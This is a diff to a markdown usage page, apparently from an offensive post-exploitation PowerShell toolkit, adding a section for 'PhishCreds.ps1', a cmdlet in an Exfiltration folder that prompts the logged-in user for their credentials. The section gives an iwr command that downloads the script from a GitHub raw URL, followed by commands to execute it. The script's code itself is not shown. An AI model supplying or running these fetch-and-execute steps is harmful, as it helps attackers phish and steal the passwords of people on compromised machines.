@@ -338,3 +338,27 @@ Get-Content -Path "$pwd\Browser.report"
 #OR get only the windows title strings
 Get-Content -Path "$pwd\Browser.report"|Select-String -Pattern 'Windows Title   :'
 ```
+
+<br />
+
+## PhishCreds.ps1
+
+|Cmdlet Name|Description|Privileges|Notes|
+|---|---|---|---|
+|[PhishCreds](https://github.com/r00t-3xp10it/redpill/blob/main/lib/Exfiltration/PhishCreds.ps1)|Prompt the current user for a valid credential|UserLand|[screenshot1](https://user-images.githubusercontent.com/23490060/211175252-6bc1556b-2168-477c-afaf-df6d394478ad.png)|
+
+<br />
+
+**download cmdLet:**
+```powershell
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/PhishCreds.ps1" -OutFile "PhishCreds.ps1"
+```
+
+**execute:**
+```powershell
+.\PhishCreds.ps1
+
+OR
+
+powershell -file "PhishCreds.ps1"
+```
